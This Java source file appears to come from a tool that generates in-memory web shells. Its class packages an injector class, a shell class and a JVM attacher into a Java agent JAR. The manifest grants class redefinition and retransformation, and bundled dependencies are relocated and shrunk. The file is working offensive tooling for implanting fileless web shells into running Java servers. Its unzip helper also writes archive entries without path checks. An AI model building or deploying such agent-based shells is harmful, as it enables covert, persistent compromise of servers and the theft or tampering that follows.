package com.reajason.javaweb.memshell.packer.jar;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.asm.ClassRenameUtils;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.jar.attach.Attacher;
import com.reajason.javaweb.memshell.packer.jar.attach.VirtualMachine;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import lombok.SneakyThrows;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;
import org.objectweb.asm.Opcodes;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.*;

/**
 * @author ReaJason
 * @since 2025/1/1
 */
public class AgentJarWithJDKAttacherPacker implements JarPacker {
    private static Path tempBootPath;

    @Override
    @SneakyThrows
    public byte[] packBytes(GenerateResult generateResult) {
        String packageName = CommonUtil.getPackageName(generateResult.getInjectorClassName());
        String mainClassName = packageName + "." + Attacher.class.getSimpleName();
        Manifest manifest = createManifest(generateResult.getInjectorClassName(), mainClassName);
        String relocatePrefix = "shade/";

        Map<String, byte[]> classes = new HashMap<>();
        Map<String, byte[]> attacherClasses = com.reajason.javaweb.buddy.ClassRenameUtils.renamePackage(Attacher.class, packageName);
        Map<String, byte[]> virtualMachineClasses = com.reajason.javaweb.buddy.ClassRenameUtils.renamePackage(VirtualMachine.class, packageName);
        classes.putAll(attacherClasses);
        classes.putAll(virtualMachineClasses);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        try (JarOutputStream targetJar = new JarOutputStream(outputStream, manifest)) {
            addDependencies(targetJar, relocatePrefix);
            addClassesToJar(targetJar, generateResult, relocatePrefix);
            for (Map.Entry<String, byte[]> entry : classes.entrySet()) {
                String className = entry.getKey();
                byte[] bytes = entry.getValue();
                targetJar.putNextEntry(new JarEntry(className.replace('.', '/') + ".class"));
                targetJar.write(ClassBytesShrink.shrink(bytes, true));
                targetJar.closeEntry();
            }
        }
        return outputStream.toByteArray();
    }

    private Manifest createManifest(String agentClass, String mainClass) {
        Manifest manifest = new Manifest();
        Attributes attributes = manifest.getMainAttributes();
        attributes.putValue("Manifest-Version", "1.0");
        attributes.putValue("Agent-Class", agentClass);
        attributes.putValue("Premain-Class", agentClass);
        attributes.putValue("Main-Class", mainClass);
        attributes.putValue("Can-Redefine-Classes", "true");
        attributes.putValue("Can-Retransform-Classes", "true");
        return manifest;
    }

    @SneakyThrows
    private void addDependencies(JarOutputStream targetJar, String relocatePrefix) {
        String baseName = Opcodes.class.getPackage().getName().replace('.', '/');
        addDependency(targetJar, Opcodes.class, baseName, relocatePrefix);
    }

    @SneakyThrows
    private void addClassesToJar(JarOutputStream targetJar, GenerateResult generateResult, String relocatePrefix) {
        String dependencyPackage = Opcodes.class.getPackage().getName();
        // Add injector class
        addClassEntry(targetJar,
                generateResult.getInjectorClassName(),
                generateResult.getInjectorBytes(),
                dependencyPackage,
                relocatePrefix);

        // Add shell class
        addClassEntry(targetJar,
                generateResult.getShellClassName(),
                generateResult.getShellBytes(),
                dependencyPackage,
                relocatePrefix);

        // Add inner classes
        for (Map.Entry<String, byte[]> entry : generateResult.getInjectorInnerClassBytes().entrySet()) {
            addClassEntry(targetJar,
                    entry.getKey(),
                    entry.getValue(),
                    dependencyPackage,
                    relocatePrefix);
        }
    }

    @SneakyThrows
    private void addClassEntry(JarOutputStream targetJar, String className, byte[] classBytes,
                               String dependencyPackage, String relocatePrefix) {
        targetJar.putNextEntry(new JarEntry(className.replace('.', '/') + ".class"));
        byte[] processedBytes = ClassBytesShrink.shrink(ClassRenameUtils.relocateClass(classBytes, dependencyPackage, relocatePrefix + dependencyPackage), true);
        targetJar.write(processedBytes);
        targetJar.closeEntry();
    }

    @SneakyThrows
    public static void addDependency(JarOutputStream targetJar, Class<?> baseClass, String baseName, String relocatePrefix) {
        URL sourceUrl = baseClass.getProtectionDomain().getCodeSource().getLocation();
        String sourceUrlString = sourceUrl.toString();
        if (sourceUrlString.contains("!BOOT-INF")) {
            String path = sourceUrlString.substring("jar:nested:".length());
            path = path.substring(0, path.indexOf("!/"));
            String[] split = path.split("/!");
            String bootJarPath = split[0];
            String internalJarPath = split[1];
            if (tempBootPath == null) {
                tempBootPath = Files.createTempDirectory("mem-shell-boot");
                unzip(bootJarPath, tempBootPath.toFile().getAbsolutePath());
            }
            sourceUrl = tempBootPath.resolve(internalJarPath).toUri().toURL();
        }
        try (JarFile sourceJar = new JarFile(new File(sourceUrl.toURI()))) {
            Enumeration<JarEntry> entries = sourceJar.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String entryName = entry.getName();
                if (entryName.equals("META-INF/MANIFEST.MF")
                        || entryName.contains("module-info.class")) {
                    continue;
                }
                if (!entry.isDirectory()) {
                    try (InputStream entryStream = sourceJar.getInputStream(entry)) {
                        byte[] bytes = IOUtils.toByteArray(entryStream);
                        if (StringUtils.isNoneEmpty(relocatePrefix)) {
                            targetJar.putNextEntry(new JarEntry(relocatePrefix + entryName));
                            if (entryName.endsWith(".class")) {
                                if (bytes.length > 0) {
                                    bytes = ClassBytesShrink.shrink(ClassRenameUtils.relocateClass(bytes, baseName, relocatePrefix + baseName), true);
                                }
                            } else {
                                targetJar.putNextEntry(entry);
                            }
                        } else {
                            targetJar.putNextEntry(entry);
                        }
                        targetJar.write(bytes);
                    }
                }
                targetJar.closeEntry();
            }
        }
    }

    /**
     * Extracts a JAR file to a temporary directory
     *
     * @param jarPath  Path to the source JAR file
     * @param tempPath Path to the temporary directory
     */
    @SneakyThrows
    public static void unzip(String jarPath, String tempPath) {
        try (JarFile jarFile = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jarFile.entries();
            while (entries.hasMoreElements()) {
                JarEntry jarEntry = entries.nextElement();
                File targetFile = new File(tempPath, jarEntry.getName());

                if (jarEntry.isDirectory()) {
                    targetFile.mkdirs();
                    continue;
                }

                targetFile.getParentFile().mkdirs();
                try (InputStream inputStream = jarFile.getInputStream(jarEntry);
                     FileOutputStream outputStream = new FileOutputStream(targetFile)) {
                    IOUtils.copy(inputStream, outputStream);
                }
            }
        }
    }
}